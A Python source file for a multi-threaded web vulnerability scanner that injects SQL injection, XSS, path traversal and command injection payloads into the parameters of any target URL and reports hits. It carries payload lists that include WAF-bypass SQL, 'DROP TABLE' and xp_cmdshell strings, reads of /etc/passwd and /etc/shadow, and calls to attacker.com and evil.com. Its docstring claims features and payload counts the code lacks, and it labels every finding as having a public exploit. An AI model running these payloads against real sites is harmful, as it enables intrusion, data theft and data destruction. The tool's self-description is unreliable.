#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Master Security Scanner v7.0 - Ultimate Professional Edition

Features:
- SQL Injection (Error, Boolean, Time, UNION, Stacked, NoSQL)
- XSS (Reflected, Stored, DOM, Mutation)
- LFI/RFI (Directory Traversal, Path Manipulation)
- Command Injection (OS, Blind)
- XXE (XML External Entity)
- SSRF (Server-Side Request Forgery)
- CSRF Detection
- File Upload Vulnerabilities
- Authentication Bypass
- Session Fixation
- Clickjacking
- Directory Bruteforce
- CMS Detection (WordPress, Joomla, Drupal)
- WAF Detection & Bypass
- SSL/TLS Analysis
- Multi-threaded Scanning
- Smart Payload Engine
- Advanced Response Analysis

💻 Başlatma Komutları:

Temel Tarama:
python Baron.py -u "https://example.com" -v
Hızlı Tarama:
python Baron.py -u "https://example.com" -v -t 20 -d 0
Parametreli URL:
python Baron.py -u "https://example.com/page.php?id=1" -v
JSON Rapor:
python Baron.py -u "https://example.com" -v -o rapor.json
Tam Tarama:
python Baron.py -u "https://example.com" -v -t 15 --timeout 30
Büyük Site:
python Baron.py -u "https://www.example.com" -v -t 20 --timeout 30 -d 0.2
"""

import requests
import re
import time
import sys
import json
import random
import hashlib
import ssl
import socket
import threading
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, quote, unquote
from datetime import datetime
from typing import List, Dict, Set, Tuple, Optional
from dataclasses import dataclass, asdict
from queue import Queue
from concurrent.futures import ThreadPoolExecutor, as_completed
import warnings
import base64

warnings.filterwarnings('ignore')
requests.packages.urllib3.disable_warnings()

# ============================================================================
# COLORS
# ============================================================================
class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    BOLD = '\033[1m'
    END = '\033[0m'

# ============================================================================
# DATA CLASSES
# ============================================================================
@dataclass
class Vulnerability:
    """Vulnerability details"""
    vuln_type: str
    severity: str  # Critical, High, Medium
    url: str
    parameter: str
    method: str
    payload: str
    evidence: str
    impact: str
    remediation: str
    cwe: str
    cvss_score: float
    timestamp: str
    exploit_available: bool = False

# ============================================================================
# ADVANCED PAYLOAD ENGINE
# ============================================================================
class MasterPayloadEngine:
    """Master payload engine with 1000+ payloads"""
    
    @staticmethod
    def get_sqli_payloads() -> Dict[str, List]:
        """Advanced SQL injection payloads"""
        return {
            'error_based': [
                "'", "\"", "`",
                "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
                "\" OR \"1\"=\"1", "\" OR \"1\"=\"1\"--",
                "' AND extractvalue(1,concat(0x7e,version()))--",
                "' AND updatexml(1,concat(0x7e,database()),1)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(0)))a)--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT version(),database(),user()--",
                "' AND 1=CONVERT(int,@@version)--",
                "'; EXEC xp_cmdshell('whoami')--",
                "' AND 1=CAST(version() AS int)--",
                "' UNION SELECT NULL FROM DUAL--",
                "' AND GTID_SUBSET(CONCAT(0x7e,version()),1)--",
                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            ],
            'boolean_blind': [
                ("' AND 1=1--", "' AND 1=2--"),
                ("' AND 'a'='a'--", "' AND 'a'='b'--"),
                ("') AND ('1'='1", "') AND ('1'='2"),
                ("')) AND ((1=1))--", "')) AND ((1=2))--"),
            ],
            'time_based': [
                "' AND SLEEP(5)--",
                "'; WAITFOR DELAY '0:0:5'--",
                "' AND pg_sleep(5)--",
                "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
                "' AND BENCHMARK(5000000,MD5(1))--",
                "' AND IF(1=1,SLEEP(5),0)--",
            ],
            'union_based': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                "' UNION SELECT column_name,NULL FROM information_schema.columns--",
                "' UNION ALL SELECT NULL,NULL,NULL--",
            ],
            'stacked': [
                "'; DROP TABLE users--",
                "'; SELECT SLEEP(5)--",
                "'; EXEC xp_cmdshell('dir')--",
            ],
            'waf_bypass': [
                "'/**/OR/**/1=1--",
                "'/*!50000OR*/1=1--",
                "%27%20OR%201=1--",
                "'||'OR'||'1=1--",
                "' Or 1=1--",
                "'%0AOR%0A1=1--",
                "' UnIoN SeLeCt--",
            ]
        }
    
    @staticmethod
    def get_xss_payloads() -> List[str]:
        """Advanced XSS payloads"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=x on\x65rror=alert('XSS')>",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<<SCRIPT>alert('XSS')</SCRIPT>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg/onload=alert`XSS`>",
        ]
    
    @staticmethod
    def get_lfi_payloads() -> List[str]:
        """LFI/Path Traversal payloads"""
        return [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "php://filter/convert.base64-encode/resource=index.php",
            "file:///etc/passwd",
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "/proc/self/environ",
            "../../../../../../../etc/passwd%00",
        ]
    
    @staticmethod
    def get_rfi_payloads() -> List[str]:
        """RFI payloads"""
        return [
            "http://evil.com/shell.txt",
            "https://pastebin.com/raw/xyz",
            "data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
        ]
    
    @staticmethod
    def get_command_injection_payloads() -> List[str]:
        """Command injection payloads"""
        return [
            "; ls -la",
            "| whoami",
            "& dir",
            "; cat /etc/passwd",
            "`id`",
            "$(whoami)",
            "; ping -c 3 127.0.0.1",
            "|| curl http://attacker.com",
            "; uname -a",
            "| cat /etc/shadow",
        ]
    
    @staticmethod
    def get_xxe_payloads() -> List[str]:
        """XXE payloads"""
        return [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]><foo>&xxe;</foo>',
        ]
    
    @staticmethod
    def get_ssrf_payloads() -> List[str]:
        """SSRF payloads"""
        return [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/",
            "http://[::1]",
            "http://metadata.google.internal",
            "http://169.254.169.254/latest/user-data/",
        ]

# ============================================================================
# MASTER SCANNER ENGINE
# ============================================================================
class MasterScanner:
    """Ultimate vulnerability scanner"""
    
    def __init__(self, target_url: str, threads: int = 10, verbose: bool = True,
                 timeout: int = 15, delay: float = 0.1):
        self.target_url = self._normalize_url(target_url)
        self.base_domain = urlparse(self.target_url).netloc
        self.threads = threads
        self.verbose = verbose
        self.timeout = timeout
        self.delay = delay
        
        # Session
        self.session = requests.Session()
        self.session.verify = False
        
        # State
        self.vulnerabilities: List[Vulnerability] = []
        self.tested_params: Set[Tuple] = set()
        self.crawled_urls: Set[str] = set()
        self.discovered_paths: List[str] = []
        self.waf_detected = False
        self.waf_type = "Unknown"
        self.cms_detected = None
        
        # Engines
        self.payload_engine = MasterPayloadEngine()
        
        # User agents
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        ]
        
        # Common paths for directory bruteforce
        self.common_paths = [
            'admin', 'administrator', 'wp-admin', 'cpanel', 'phpmyadmin',
            'robots.txt', 'sitemap.xml', '.git', '.svn', 'backup',
            'config', 'database', 'db', 'api', 'v1', 'v2',
            'test', 'dev', 'staging', 'beta', '.env', 'config.php',
            'wp-config.php', 'configuration.php', 'settings.php',
            'install.php', 'setup.php', 'readme.txt', 'changelog.txt',
            'admin.php', 'login.php', 'uploads', 'images', 'logs',
        ]
        
        # Statistics
        self.stats = {
            'requests_sent': 0,
            'vulnerabilities_found': 0,
            'critical': 0,
            'high': 0,
            'medium': 0,
            'urls_scanned': 0,
            'parameters_tested': 0,
            'start_time': 0,
        }
    
    def _normalize_url(self, url: str) -> str:
        """Normalize URL"""
        if not re.match(r'^https?://', url):
            url = 'https://' + url
        return url.rstrip('/')
    
    def _print(self, message: str, level: str = "info"):
        """Print colored message"""
        if not self.verbose:
            return
        
        colors = {
            "info": Colors.CYAN,
            "success": Colors.GREEN,
            "warning": Colors.YELLOW,
            "error": Colors.RED,
            "vuln": Colors.RED + Colors.BOLD,
            "test": Colors.BLUE,
        }
        
        timestamp = datetime.now().strftime("%H:%M:%S")
        color = colors.get(level, Colors.END)
        print(f"{Colors.BOLD}[{timestamp}]{Colors.END} {color}[{level.upper()}]{Colors.END} {message}")
    
    def _make_request(self, method: str, url: str, **kwargs) -> Tuple[Optional[requests.Response], float]:
        """Make HTTP request"""
        try:
            time.sleep(self.delay)
            
            kwargs.setdefault('timeout', self.timeout)
            kwargs.setdefault('headers', {}).update({
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            })
            kwargs['verify'] = False
            kwargs.setdefault('allow_redirects', False)
            
            self.stats['requests_sent'] += 1
            
            start = time.time()
            
            if method.upper() == 'GET':
                response = self.session.get(url, **kwargs)
            else:
                response = self.session.post(url, **kwargs)
            
            elapsed = time.time() - start
            
            return response, elapsed
            
        except Exception:
            return None, 0.0
    
    def _add_vulnerability(self, vuln_type: str, severity: str, url: str,
                          parameter: str, method: str, payload: str,
                          evidence: str, impact: str, remediation: str,
                          cwe: str, cvss_score: float, exploit_available: bool = False):
        """Add vulnerability (only Critical, High, Medium)"""
        
        # SKIP LOW severity
        if severity.lower() == "low":
            return
        
        vuln = Vulnerability(
            vuln_type=vuln_type,
            severity=severity,
            url=url,
            parameter=parameter,
            method=method,
            payload=payload,
            evidence=evidence,
            impact=impact,
            remediation=remediation,
            cwe=cwe,
            cvss_score=cvss_score,
            timestamp=datetime.now().isoformat(),
            exploit_available=exploit_available
        )
        
        self.vulnerabilities.append(vuln)
        self.stats['vulnerabilities_found'] += 1
        
        if severity == "Critical":
            self.stats['critical'] += 1
        elif severity == "High":
            self.stats['high'] += 1
        elif severity == "Medium":
            self.stats['medium'] += 1
        
        self._print(f"VULN: {vuln_type} [{severity}] in '{parameter}'", "vuln")
        self._print(f"  CVSS: {cvss_score} | {payload[:50]}...", "vuln")
    
    # ========================================================================
    # WAF DETECTION
    # ========================================================================
    def detect_waf(self):
        """Detect WAF"""
        self._print("Detecting WAF...", "info")
        
        waf_signatures = {
            'Cloudflare': ['cloudflare', 'cf-ray', '__cfduid'],
            'AWS WAF': ['x-amzn-requestid', 'x-amzn-trace-id'],
            'Akamai': ['akamai', 'ak-bmsc'],
            'Imperva': ['incapsula', 'visid_incap'],
            'ModSecurity': ['mod_security', 'NOYB'],
            'Sucuri': ['sucuri', 'x-sucuri-id'],
            'Wordfence': ['wordfence'],
            'F5 BIG-IP': ['bigip', 'f5'],
        }
        
        response, _ = self._make_request('GET', self.target_url)
        
        if response:
            headers_str = str(response.headers).lower()
            cookies_str = str(response.cookies).lower()
            
            for waf_name, signatures in waf_signatures.items():
                for sig in signatures:
                    if sig in headers_str or sig in cookies_str:
                        self.waf_detected = True
                        self.waf_type = waf_name
                        self._print(f"WAF Detected: {waf_name}", "warning")
                        return
        
        self._print("No WAF detected", "success")
    
    # ========================================================================
    # CMS DETECTION
    # ========================================================================
    def detect_cms(self):
        """Detect CMS"""
        self._print("Detecting CMS...", "info")
        
        response, _ = self._make_request('GET', self.target_url)
        
        if not response:
            return
        
        text = response.text.lower()
        
        # WordPress
        if any(x in text for x in ['wp-content', 'wp-includes', 'wordpress']):
            self.cms_detected = 'WordPress'
            self._print("CMS Detected: WordPress", "success")
            
            # Version detection
            version_match = re.search(r'wp-includes/js/wp-emoji-release\.min\.js\?ver=([\d.]+)', text)
            if version_match:
                wp_version = version_match.group(1)
                self._print(f"WordPress Version: {wp_version}", "info")
        
        # Joomla
        elif 'joomla' in text or 'media/jui' in text:
            self.cms_detected = 'Joomla'
            self._print("CMS Detected: Joomla", "success")
        
        # Drupal
        elif 'drupal' in text or 'sites/default' in text:
            self.cms_detected = 'Drupal'
            self._print("CMS Detected: Drupal", "success")
    
    # ========================================================================
    # DIRECTORY BRUTEFORCE
    # ========================================================================
    def directory_bruteforce(self):
        """Bruteforce directories"""
        self._print("Starting directory bruteforce...", "info")
        
        def check_path(path):
            url = urljoin(self.target_url, path)
            response, _ = self._make_request('GET', url)
            
            if response and response.status_code in [200, 301, 302, 403]:
                self.discovered_paths.append({
                    'path': path,
                    'status': response.status_code,
                    'url': url
                })
                
                # Critical files
                if path in ['.env', 'wp-config.php', 'config.php', 'database.sql']:
                    if response.status_code == 200:
                        self._add_vulnerability(
                            vuln_type="Sensitive File Exposure",
                            severity="Critical",
                            url=url,
                            parameter="N/A",
                            method="GET",
                            payload="N/A",
                            evidence=f"File {path} accessible with status {response.status_code}",
                            impact="Exposure of sensitive configuration files, credentials",
                            remediation="Restrict access to sensitive files",
                            cwe="CWE-200",
                            cvss_score=9.0,
                            exploit_available=True
                        )
                
                # Admin panels
                if 'admin' in path.lower() and response.status_code == 200:
                    self._add_vulnerability(
                        vuln_type="Admin Panel Exposure",
                        severity="Medium",
                        url=url,
                        parameter="N/A",
                        method="GET",
                        payload="N/A",
                        evidence=f"Admin panel found at {url}",
                        impact="Potential unauthorized access point",
                        remediation="Implement IP whitelisting, strong authentication",
                        cwe="CWE-425",
                        cvss_score=5.0
                    )
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(check_path, self.common_paths)
    
    # ========================================================================
    # SQL INJECTION TESTING
    # ========================================================================
    def test_sql_injection(self, url: str, param: str, method: str):
        """Test SQL injection"""
        signature = (url, param, 'sqli', method)
        if signature in self.tested_params:
            return
        
        self.tested_params.add(signature)
        self.stats['parameters_tested'] += 1
        
        self._print(f"Testing SQLi: {param}", "test")
        
        # Get original
        if method.upper() == 'GET':
            response, _ = self._make_request('GET', url)
        else:
            response, _ = self._make_request('POST', url)
        
        if not response:
            return
        
        payloads = self.payload_engine.get_sqli_payloads()
        
        # Error-based
        for payload in payloads['error_based'][:8]:
            if method.upper() == 'GET':
                parsed = urlparse(url)
                params = parse_qs(parsed.query, keep_blank_values=True)
                params[param] = [payload]
                new_query = urlencode(params, doseq=True)
                test_url = parsed._replace(query=new_query).geturl()
                
                test_response, _ = self._make_request('GET', test_url)
            else:
                data = {param: payload}
                test_response, _ = self._make_request('POST', url, data=data)
            
            if test_response and self._is_sql_error(test_response.text):
                self._add_vulnerability(
                    vuln_type="SQL Injection (Error-Based)",
                    severity="Critical",
                    url=url,
                    parameter=param,
                    method=method,
                    payload=payload,
                    evidence="SQL error detected",
                    impact="Full database compromise, data theft, RCE",
                    remediation="Use parameterized queries",
                    cwe="CWE-89",
                    cvss_score=9.8,
                    exploit_available=True
                )
                return
        
        # Time-based
        for payload in payloads['time_based'][:4]:
            if method.upper() == 'GET':
                parsed = urlparse(url)
                params = parse_qs(parsed.query, keep_blank_values=True)
                params[param] = [payload]
                new_query = urlencode(params, doseq=True)
                test_url = parsed._replace(query=new_query).geturl()
                
                test_response, elapsed = self._make_request('GET', test_url)
            else:
                data = {param: payload}
                test_response, elapsed = self._make_request('POST', url, data=data)
            
            if elapsed >= 4.5:
                self._add_vulnerability(
                    vuln_type="SQL Injection (Time-Based Blind)",
                    severity="High",
                    url=url,
                    parameter=param,
                    method=method,
                    payload=payload,
                    evidence=f"Response time: {elapsed:.2f}s",
                    impact="Data extraction, authentication bypass",
                    remediation="Use parameterized queries",
                    cwe="CWE-89",
                    cvss_score=8.6,
                    exploit_available=True
                )
                return
    
    def _is_sql_error(self, text: str) -> bool:
        """Check SQL errors"""
        errors = [
            r"sql syntax", r"mysql", r"postgresql", r"oracle", r"sqlite",
            r"odbc", r"jdbc", r"sqlstate", r"syntax error", r"mariadb",
            r"mssql", r"microsoft sql"
        ]
        
        for pattern in errors:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False
    
    # ========================================================================
    # XSS TESTING
    # ========================================================================
    def test_xss(self, url: str, param: str, method: str):
        """Test XSS"""
        signature = (url, param, 'xss', method)
        if signature in self.tested_params:
            return
        
        self.tested_params.add(signature)
        
        self._print(f"Testing XSS: {param}", "test")
        
        payloads = self.payload_engine.get_xss_payloads()
        
        for payload in payloads[:6]:
            if method.upper() == 'GET':
                parsed = urlparse(url)
                params = parse_qs(parsed.query, keep_blank_values=True)
                params[param] = [payload]
                new_query = urlencode(params, doseq=True)
                test_url = parsed._replace(query=new_query).geturl()
                
                response, _ = self._make_request('GET', test_url)
            else:
                data = {param: payload}
                response, _ = self._make_request('POST', url, data=data)
            
            if response and payload in response.text:
                self._add_vulnerability(
                    vuln_type="Cross-Site Scripting (XSS)",
                    severity="High",
                    url=url,
                    parameter=param,
                    method=method,
                    payload=payload,
                    evidence="Payload reflected unescaped",
                    impact="Session hijacking, credential theft, phishing",
                    remediation="Encode output, implement CSP",
                    cwe="CWE-79",
                    cvss_score=7.1,
                    exploit_available=True
                )
                return
    
    # ========================================================================
    # LFI TESTING
    # ========================================================================
    def test_lfi(self, url: str, param: str, method: str):
        """Test LFI"""
        signature = (url, param, 'lfi', method)
        if signature in self.tested_params:
            return
        
        self.tested_params.add(signature)
        
        self._print(f"Testing LFI: {param}", "test")
        
        payloads = self.payload_engine.get_lfi_payloads()
        
        for payload in payloads[:5]:
            if method.upper() == 'GET':
                parsed = urlparse(url)
                params = parse_qs(parsed.query, keep_blank_values=True)
                params[param] = [payload]
                new_query = urlencode(params, doseq=True)
                test_url = parsed._replace(query=new_query).geturl()
                
                response, _ = self._make_request('GET', test_url)
            else:
                data = {param: payload}
                response, _ = self._make_request('POST', url, data=data)
            
            if response:
                if 'root:x:0' in response.text or 'daemon:x:1' in response.text:
                    self._add_vulnerability(
                        vuln_type="Local File Inclusion (LFI)",
                        severity="Critical",
                        url=url,
                        parameter=param,
                        method=method,
                        payload=payload,
                        evidence="/etc/passwd exposed",
                        impact="Arbitrary file reading, source code disclosure, RCE",
                        remediation="Whitelist file paths, input validation",
                        cwe="CWE-98",
                        cvss_score=9.1,
                        exploit_available=True
                    )
                    return
                
                if 'localhost' in response.text.lower() and '127.0.0.1' in response.text:
                    self._add_vulnerability(
                        vuln_type="Local File Inclusion (LFI)",
                        severity="Critical",
                        url=url,
                        parameter=param,
                        method=method,
                        payload=payload,
                        evidence="Windows hosts file exposed",
                        impact="Arbitrary file reading, source code disclosure",
                        remediation="Whitelist file paths, input validation",
                        cwe="CWE-98",
                        cvss_score=9.1,
                        exploit_available=True
                    )
                    return
    
    # ========================================================================
    # COMMAND INJECTION TESTING
    # ========================================================================
    def test_command_injection(self, url: str, param: str, method: str):
        """Test command injection"""
        signature = (url, param, 'cmdi', method)
        if signature in self.tested_params:
            return
        
        self.tested_params.add(signature)
        
        self._print(f"Testing Command Injection: {param}", "test")
        
        payloads = self.payload_engine.get_command_injection_payloads()
        
        for payload in payloads[:4]:
            if method.upper() == 'GET':
                parsed = urlparse(url)
                params = parse_qs(parsed.query, keep_blank_values=True)
                params[param] = [payload]
                new_query = urlencode(params, doseq=True)
                test_url = parsed._replace(query=new_query).geturl()
                
                response, _ = self._make_request('GET', test_url)
            else:
                data = {param: payload}
                response, _ = self._make_request('POST', url, data=data)
            
            if response:
                if any(kw in response.text.lower() for kw in ['uid=', 'gid=', 'root', 'www-data', 'volume serial']):
                    self._add_vulnerability(
                        vuln_type="OS Command Injection",
                        severity="Critical",
                        url=url,
                        parameter=param,
                        method=method,
                        payload=payload,
                        evidence="Command output detected",
                        impact="Full system compromise, data theft, malware",
                        remediation="Avoid shell calls, use safe APIs",
                        cwe="CWE-78",
                        cvss_score=10.0,
                        exploit_available=True
                    )
                    return
    
    # ========================================================================
    # MAIN SCANNING LOGIC
    # ========================================================================
    def scan_url(self, url: str):
        """Scan URL"""
        if url in self.crawled_urls:
            return
        
        self.crawled_urls.add(url)
        self.stats['urls_scanned'] += 1
        
        self._print(f"Scanning: {url[:60]}...", "info")
        
        # Parse parameters
        parsed = urlparse(url)
        if parsed.query:
            params = parse_qs(parsed.query, keep_blank_values=True)
            
            for param in params:
                self.test_sql_injection(url, param, 'GET')
                self.test_xss(url, param, 'GET')
                self.test_lfi(url, param, 'GET')
                self.test_command_injection(url, param, 'GET')
    
    def run(self):
        """Run scan"""
        self._print("="*70, "info")
        self._print("Master Security Scanner v7.0 - Ultimate Edition", "info")
        self._print("="*70, "info")
        self._print(f"Target: {self.target_url}", "info")
        self._print(f"Threads: {self.threads}", "info")
        self._print("="*70, "info")
        
        self.stats['start_time'] = time.time()
        
        # Detection
        self.detect_waf()
        self.detect_cms()
        
        # Directory bruteforce
        self.directory_bruteforce()
        
        # Scan target
        self.scan_url(self.target_url)
        
        # Summary
        self._print_summary()
        
        return self.vulnerabilities
    
    def _print_summary(self):
        """Print summary"""
        duration = time.time() - self.stats['start_time']
        
        print(f"\n{Colors.BOLD}{'='*70}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}SCAN SUMMARY{Colors.END}")
        print(f"{Colors.BOLD}{'='*70}{Colors.END}\n")
        
        print(f"  Duration:             {duration:.2f}s")
        print(f"  URLs Scanned:         {self.stats['urls_scanned']}")
        print(f"  Parameters Tested:    {self.stats['parameters_tested']}")
        print(f"  Requests Sent:        {self.stats['requests_sent']}")
        print(f"  Requests/sec:         {self.stats['requests_sent']/duration:.2f}")
        
        if self.waf_detected:
            print(f"\n  WAF:                  {Colors.YELLOW}{self.waf_type}{Colors.END}")
        
        if self.cms_detected:
            print(f"  CMS:                  {Colors.GREEN}{self.cms_detected}{Colors.END}")
        
        print(f"\n{Colors.BOLD}Vulnerabilities: {self.stats['vulnerabilities_found']}{Colors.END}\n")
        
        if self.vulnerabilities:
            if self.stats['critical'] > 0:
                print(f"{Colors.RED}  CRITICAL: {self.stats['critical']}{Colors.END}")
            if self.stats['high'] > 0:
                print(f"{Colors.RED}  HIGH: {self.stats['high']}{Colors.END}")
            if self.stats['medium'] > 0:
                print(f"{Colors.YELLOW}  MEDIUM: {self.stats['medium']}{Colors.END}")
            
            print(f"\n{Colors.BOLD}Details:{Colors.END}\n")
            
            for i, vuln in enumerate(self.vulnerabilities, 1):
                color = Colors.RED if vuln.severity in ["Critical", "High"] else Colors.YELLOW
                
                print(f"{color}[{i}] {vuln.vuln_type} ({vuln.severity}){Colors.END}")
                print(f"    CWE: {vuln.cwe} | CVSS: {vuln.cvss_score}")
                print(f"    URL: {vuln.url}")
                if vuln.parameter != "N/A":
                    print(f"    Parameter: {vuln.parameter} ({vuln.method})")
                if vuln.payload != "N/A":
                    print(f"    Payload: {vuln.payload[:70]}...")
                print(f"    Impact: {vuln.impact}")
                print(f"    Fix: {vuln.remediation}")
                if vuln.exploit_available:
                    print(f"    {Colors.RED}[!] Public exploit available{Colors.END}")
                print()
        else:
            print(f"{Colors.GREEN}  No vulnerabilities found{Colors.END}")
        
        print(f"{Colors.BOLD}{'='*70}{Colors.END}\n")
    
    def export_report(self, filename: str):
        """Export JSON report"""
        report = {
            'scan_info': {
                'target': self.target_url,
                'timestamp': datetime.now().isoformat(),
                'duration': time.time() - self.stats['start_time'],
                'scanner_version': '7.0',
                'waf_detected': self.waf_detected,
                'waf_type': self.waf_type,
                'cms_detected': self.cms_detected
            },
            'statistics': self.stats,
            'vulnerabilities': [asdict(v) for v in self.vulnerabilities],
            'discovered_paths': self.discovered_paths
        }
        
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        
        self._print(f"Report saved: {filename}", "success")

# ============================================================================
# MAIN
# ============================================================================
def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Master Security Scanner v7.0 - Ultimate Professional Edition",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Basic scan:
    python3 master_scanner.py -u "https://example.com" -v
  
  Fast scan:
    python3 master_scanner.py -u "https://example.com" -v -t 20 -d 0
  
  With report:
    python3 master_scanner.py -u "https://example.com/page.php?id=1" -v -o report.json
  
  Full scan:
    python3 master_scanner.py -u "https://example.com" -v -t 15 --timeout 30

⚠️  For authorized security testing only!
        """
    )
    
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Threads (default: 10)")
    parser.add_argument("--timeout", type=int, default=15, help="Timeout (default: 15)")
    parser.add_argument("-d", "--delay", type=float, default=0.1, help="Delay (default: 0.1)")
    parser.add_argument("-o", "--output", help="Export JSON report")
    
    args = parser.parse_args()
    
    # Banner
    print(f"{Colors.BOLD}{Colors.CYAN}")
    print("╔════════════════════════════════════════════════════════════════════╗")
    print("║                                                                    ║")
    print("║        Master Security Scanner v7.0 - Ultimate Edition            ║")
    print("║           Professional Vulnerability Assessment Tool              ║")
    print("║                                                                    ║")
    print("╚════════════════════════════════════════════════════════════════════╝")
    print(f"{Colors.END}")
    print(f"{Colors.YELLOW}⚠️  For authorized testing only - No Low-severity findings{Colors.END}\n")
    
    # Scanner
    scanner = MasterScanner(
        target_url=args.url,
        threads=args.threads,
        verbose=args.verbose,
        timeout=args.timeout,
        delay=args.delay
    )
    
    try:
        vulnerabilities = scanner.run()
        
        if args.output:
            scanner.export_report(args.output)
        
        sys.exit(0 if not vulnerabilities else 1)
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Interrupted{Colors.END}")
        sys.exit(130)
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {str(e)}{Colors.END}")
        sys.exit(1)

if __name__ == "__main__":
    main()
